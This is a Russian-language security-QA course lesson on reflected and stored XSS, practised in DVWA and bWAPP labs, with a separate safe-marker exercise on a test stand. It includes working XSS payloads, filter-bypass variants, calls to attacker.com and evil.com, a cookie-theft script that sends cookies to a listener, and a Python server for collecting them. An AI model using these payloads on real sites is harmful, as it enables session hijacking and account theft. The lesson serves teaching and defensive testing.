# Занятие 20. XSS (Reflected/Stored): Практика на DVWA

## Учебная рамка

**Входные требования:** Базовое понимание HTTP, форм, параметров URL и работы браузера/DevTools.

**Результат занятия:** Студент воспроизводит уязвимость только в учебном приложении и объясняет условие ее возникновения и способ защиты.

**Наследуемая SDET-компетенция:** test design, negative testing, API/UI evidence и перевод OWASP-риска в проверяемый QA-кейс.

**Security QA-компетенция:** моделирование web-рисков OWASP и безопасная ручная проверка Slider AI.

**Связь с книгами:** OWASP/WSTG как основной security reference; «PyCharm. Профессиональная работа на Python 2024» — DevTools/HTTP Client/evidence workflow.

**Основной источник:** «PyCharm. Профессиональная работа на Python 2024» и `Black Hat Python` только для lab-only/defensive interpretation.

**Дополнительные источники:** «Легкий способ выучить Python 3 еще глубже» для обработки запросов, текстов и простых проверочных данных.

**Что берем из источника:** разделение lab payload и product-safe marker, HTTP evidence, перевод риска OWASP в security test case.

**Как это превращается в SDET/Security QA навык:** проектировать безопасные проверки Slider AI через OWASP/WSTG без destructive payloads.

**Что нельзя переносить на Slider AI без отдельного разрешения:** учебные payloads выполнять только в DVWA/WebGoat/PortSwigger; на Slider AI использовать безопасные маркеры и passive evidence.


**Процессный артефакт:** `THREAT_MODEL.md` или `SECURITY_FINDING_TEMPLATE.md`: abuse case, evidence и expected control.

**Безопасная цель:** DVWA, WebGoat, bWAPP, PortSwigger Web Security Academy или локальная учебная VM. Запрещены реальные сайты без письменного разрешения.

**Среда выполнения:** Основной путь — macOS native, браузер, DevTools, Homebrew и Python. Kali Linux ARM64 VM, UTM или cloud lab используются только если это явно требуется задачей или вынесено в углубление.

**Обязательный путь новичка:** Пройти демонстрационный сценарий на низком уровне сложности, сделать скриншот/лог запроса и описать причину уязвимости.

**Углубление:** Повторить на более высоком уровне сложности, сравнить поведение фильтров и предложить безопасную реализацию.

**Минимальная проверка успеха:** Уязвимость подтверждена в учебной среде, payload не направлялся на реальные сервисы, студент может назвать защитную меру.

**Эталонный вывод:** Отчет содержит URL учебной лаборатории, введенный payload, фрагмент ответа и объяснение риска простыми словами.

**Критерии сдачи:** Зачет: подтверждена учебная уязвимость и описана защита. Отлично: добавлен разбор, почему payload работает или перестает работать.

## Reading pack из книг курса

Этот раздел не является заданием “пойди и найди теорию в книгах”. Книги использованы автором курса для подготовки лекции `Занятие 20. XSS (Reflected/Stored): Практика на DVWA`, а студент получает самодостаточное объяснение в разделах `Source-driven theory` и `Теория`.

- `docs/socraticode/pycharm-professional-python-2024-pages/`
- `docs/socraticode/black-hat-python-ru-pages/` только lab-only/defensive

Конкретные страницы для этого блока: `pycharm-professional-python-2024-pages/page-338.md`-`page-369.md`; `black-hat-python-ru-pages/page-120.md`-`page-140.md` только lab-only.

Что обязана объяснить лекция на основе этих книг:

1. Термины и команды, которые прямо поддерживают тему урока.
2. Инженерный принцип, который переносится из SDET в Security QA.
3. Ограничение безопасности: что нельзя делать на Slider AI без approval.
4. Пример, который превращается в evidence, helper, checklist или process artifact.

Если книга описывает опасную технику, она переносится только в lab-only или defensive interpretation. Студент не должен обращаться к книгам, чтобы понять базовую теорию текущего урока.

## Source-driven theory

Этот урок опирается на книжные источники курса как на базу, а не как на факультативное чтение. Из источников берется практическая дисциплина: разделение lab payload и product-safe marker, HTTP evidence, перевод риска OWASP в security test case. Для SDET это важно потому, что security-проверка должна быть воспроизводимой, объяснимой и пригодной для отчета, а не превращаться в набор разрозненных команд.

Книжный материал в уроке используется в трех шагах:

1. Понять термин или технику на безопасном примере.
2. Перевести идею в QA-действие: test case, observation, evidence, helper или process artifact.
3. Отделить разрешенную практику от действий, которые требуют отдельного approval.

Граница для Slider AI: учебные payloads выполнять только в DVWA/WebGoat/PortSwigger; на Slider AI использовать безопасные маркеры и passive evidence. Если нужная техника выходит за эту границу, результат урока оформляется как `requires approval`, lab-only practice или defensive recommendation.

## Теория

**XSS (Cross-Site Scripting)** — это уязвимость, позволяющая внедрить вредоносный JavaScript-код в страницу, которая отображается другим пользователям.

### Типы XSS

1. **Reflected XSS (Отраженный)**:
   - Скрипт передается через URL или форму
   - Не сохраняется на сервере
   - Работает только при переходе по специальной ссылке
   - Часто используется в фишинге

2. **Stored XSS (Хранимый)**:
   - Скрипт сохраняется на сервере (в БД, комментариях, профиле)
   - Выполняется при каждом просмотре страницы
   - Опаснее, так как поражает всех посетителей

3. **DOM-based XSS** (рассматривается в следующем уроке):
   - Уязвимость в клиентском JavaScript
   - Скрипт выполняется через манипуляцию DOM

### Механизм работы Reflected XSS

1. Атакующий создает ссылку с пейлоадом: `http://site.com/search?q=<script>alert(1)</script>`
2. Жертва переходит по ссылке
3. Сервер "отражает" параметр q в ответе без фильтрации
4. Браузер жертвы выполняет скрипт

### Механизм работы Stored XSS

1. Атакующий отправляет комментарий с кодом: `<script>stealCookies()</script>`
2. Сервер сохраняет комментарий в БД
3. При просмотре страницы код выполняется в браузере каждого посетителя

### Что можно сделать через XSS

- Украсть cookie сессии: `document.cookie`
- Перехватить нажатия клавиш (keylogger)
- Изменить содержимое страницы (defacement)
- Перенаправить на фишинговый сайт
- Выполнить CSRF-атаку

### Обход фильтров

| Фильтр | Обход |
|--------|-------|
| `<script>` заблокирован | `<img src=x onerror=alert(1)>` |
| `alert()` заблокирован | `<img src=x onerror=confirm(1)>` |
| Только小写 | `<IMG SRC=x ONERROR=alert(1)>` |
| Запятые | `<svg/onload=alert(1)>` |

---

## Guided practice

1. Сформулируйте риск урока как abuse case и как проверяемое ожидание защиты.
2. Отработайте опасную технику только в lab, если урок этого требует.
3. Для Slider AI выполните safe-marker или passive observation без извлечения данных и без destructive payload.
4. Классифицируйте результат: `finding`, `observation`, `not reproducible`, `not applicable` или `requires approval`.

### Эталон самостоятельной работы

К концу guided practice у студента есть короткий Markdown-артефакт: цель проверки, выполненные шаги, sanitized evidence, интерпретация результата, границы применимости и следующий безопасный шаг.

## Практическое занятие

### Настройка DVWA

1. Откройте http://192.168.0.x (IP вашей VM с DVWA)
2. Установите уровень безопасности **Low** (DVWA Security)
3. Перейдите в **XSS (Reflected)**

### Практика: Reflected XSS

**Шаг 1: Базовый пейлоад**
```
<input>: <script>alert('XSS')</script>
```
Результат: всплывающее окно с текстом "XSS".

**Шаг 2: Кража cookie**
```
<input>: <script>alert(document.cookie)</script>
```
Результат: показывает cookie текущей сессии (PHPSESSID).

**Шаг 3: Перенаправление**
```
<input>: <script>window.location='http://evil.com'</script>
```
Результат: браузер перенаправляется на evil.com.

**Шаг 4: Использование img тега (обход фильтра)**
```
<input>: <img src=x onerror=alert('XSS')>
```
Результат: срабатывает обработчик onerror.

**Шаг 5: JavaScript из внешнего источника**
```
<input>: <script src="http://attacker.com/evil.js"></script>
```
(требует настроенного сервера атакующего)

### Практика: Stored XSS

Перейдите в **XSS (Stored)**.

**Шаг 1: Внедрение скрипта в гостевую книгу**
```
Name: Hacker
Message: <script>alert('Stored XSS!')</script>
```
Результат: после отправки, при каждой загрузке страницы будет всплывать alert.

**Шаг 2: Кража cookie (отправка на сервер атакующего)**
```
Message: <script>
  var img = new Image();
  img.src = 'http://192.168.0.123:4444/steal?c=' + document.cookie;
</script>
```

Для приема украденных cookie запустите слушатель (замените IP на ваш в локальной сети):
```bash
nc -lvnp 4444
```

Пример вывода при краже cookie:
```
listening on [any] 4444 ...
connect to [192.168.0.123] from (UNKNOWN) [172.17.0.2] 54321
GET /steal?c=PHPSESSID=abc123def456;%20security=low HTTP/1.1
Host: 192.168.0.123:4444
User-Agent: Mozilla/5.0...
```

**Шаг 3: Невидимый iframe**
```
Message: <iframe src="javascript:alert('XSS')" style="display:none"></iframe>
```

### Скриншоты для отчета

1. **Скриншот 1**: Reflected XSS — всплывающее окно с alert()
2. **Скриншот 2**: Stored XSS — сообщение с скриптом в гостевой книге
3. **Скриншот 3**: Stored XSS — alert срабатывает при загрузке страницы

### Примеры вывода

**Reflected XSS — успешный пейлоад:**
```html
<!-- Исходный код ответа после ввода <script>alert('XSS')</script> -->
<pre>Hello <script>alert('XSS')</script></pre>
<div class="body_padded">
  <p>Hello <script>alert('XSS')</script></p>
</div>
```

**Stored XSS — кража cookie (запрос на сервер атакующего):**
```
GET /steal?c=PHPSESSID%3Dabc123def456%3B%20security%3Dlow HTTP/1.1
Host: 192.168.0.123:4444
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
Referer: http://192.168.0.x/vulnerabilities/xss_s/
```

**Ответ сервера при XSS в bWAPP:**
```html
<div id="main">
  <p>Welcome <script>alert(1)</script>!</p>
</div>
```

### Частые ошибки

1. **Пытаться выполнить XSS в адресной строке без параметра** — нужен параметр, который попадает в DOM
2. **Забыть про фильтры** — на уровне Medium `<script>` часто фильтруется, используйте `<img onerror>`
3. **Stored XSS не срабатывает** — возможно, нужно обновить страницу или проверить, сохранилось ли сообщение
4. **HttpOnly cookie** — если cookie имеет флаг HttpOnly, `document.cookie` её не вернет

### Вопросы на понимание

1. В чем разница между Reflected и Stored XSS с точки зрения жертвы?
2. Почему Stored XSS опаснее Reflected?
3. Что делает флаг HttpOnly и как он защищает от XSS?
4. Почему `<img src=x onerror=alert(1)>` работает, когда `<script>` заблокирован?

### Адаптация под macOS (M2)

```bash
# Создание простого сервера для приема украденных cookie (Python3 на macOS)
cat > steal_server.py << 'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Stolen: {self.path}")
        self.send_response(200)
        self.end_headers()
        
    def log_message(self, format, *args):
        pass  # Отключаем стандартные логи

print("[*] Listening on 0.0.0.0:4444")
HTTPServer(('0.0.0.0', 4444), Handler).serve_forever()
EOF

python3 steal_server.py
```

---


## Адаптация под macOS (M2, 8GB)

- Для macOS native используйте Homebrew или официальный installer: `brew install <tool>`; для явно помеченной Kali/Linux-среды допустим `apt`.
- Kali/Linux VM запускайте только как углубление и выделяйте не более 3-4GB RAM на MacBook Air M2 (8GB)
- Если нужна Kali/Linux VM на Apple Silicon, используйте ARM64-образ в UTM/VMware Fusion/Parallels; не используйте x86/x64 VM как базовый путь.
- Docker работает нативно на M2: `docker pull <image>`
- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
- Для Python используйте `pip3 install` вместо `pip install`


## Задачи для самостоятельного выполнения

1. **Reflected XSS на уровне Low**: В DVWA (XSS Reflected) выполните пейлоады:
   - `<script>alert(1)</script>`
   - `<img src=x onerror=alert(1)>`
   - `<svg/onload=alert(1)>`
   
   Опишите, какие сработали и какой код отображается в исходном HTML страницы.

2. **Stored XSS — кража cookie**: Настройте простой Python-сервер для приема украденных cookie:
   ```python
   from http.server import BaseHTTPRequestHandler, HTTPServer
   class Handler(BaseHTTPRequestHandler):
       def do_GET(self):
           print("Stolen:", self.path)
           self.send_response(200)
   HTTPServer(('0.0.0.0', 4444), Handler).serve_forever()
   ```
   Внедрите Stored XSS, который отправит cookie на этот сервер. Покажите в отчете, какие cookie были перехвачены.

3. **Обход фильтров на уровне Medium**: Переключите DVWA на уровень **Medium** в XSS (Reflected). Попробуйте пейлоады:
   - `<script>alert(1)</script>`
   - `<sCrIpT>alert(1)</script>`
   - `<img src=x onerror=alert(1)>`
   
   Какой пейлоад сработал? Почему?

4. **XSS в bWAPP**: Откройте bWAPP (http://192.168.0.x), выберите уязвимость **XSS - Reflected (GET)**, уровень low. Выполните XSS с пейлоадом `<script>alert('bWAPP XSS')</script>`. Сделайте скриншот результата.

5. **Cookie с флагом HttpOnly**: В DVWA (уровень Low) проверьте, есть ли у cookie флаг HttpOnly. Откройте DevTools → Application → Cookies. Если cookie доступна через `document.cookie`, значит HttpOnly отключен. Опишите, как это влияет на XSS-атаку.

## Практика на Slider AI

**Цель стенда:** `https://olddev.slider-ai.ru`

**Контекст разрешения:** тестовый стенд проекта Slider AI, доступен QA для обучения и проверки безопасности. Production и любые другие домены не входят в это задание.

**Ограничения безопасности:** соблюдать `education/slider_ai_scope.md`; не выполнять DoS/load-тесты, brute force, destructive payloads, изменение чужих данных, извлечение секретов и действия вне согласованного scope.

**Уровень прогрессии:** Reflected/Stored XSS

### Минимум

Найдите текстовое поле и введите безопасный маркер `qa-xss-check-<date>` без script payload.

### Практика Slider AI

Проверьте, как маркер отображается: escaped, sanitized, сохранен или отброшен.

### Углубление после изучения следующих уроков

После урока 27 подтвердите encoding в HTTP-ответе через Burp/DevTools без cookie theft payload.

### Артефакт сдачи

Markdown-запись по шаблону из `education/slider_ai_scope.md`: урок, компонент Slider AI, шаги, фактический результат, доказательства без секретов, риск, рекомендация и статус.

### Критерий готовности

Задание выполнено только на `olddev.slider-ai.ru`, не выходит за scope, содержит проверяемый артефакт и явно отмечает `finding`, `informational`, `not reproducible`, `not applicable` или `requires approval`.

## Rubric

| Уровень | Что должно быть сдано |
|---|---|
| Зачет | Выполнен обязательный путь новичка, есть sanitized evidence, действия не выходят за scope |
| Хорошо | Есть объяснение риска или процесса, аккуратные шаги воспроизведения и корректный статус результата |
| Отлично | Результат связан с `OWASP Test Design for Slider AI`, remediation/retest или automation appendix |

## Self-check

1. Какая SDET-компетенция используется в уроке?
2. Какая часть объяснения опирается на книги курса?
3. Где проходит безопасная граница для Slider AI?
4. Какой артефакт можно показать команде без раскрытия секретов?
5. Что нужно вынести в углубление, lab-only или отдельный approval?
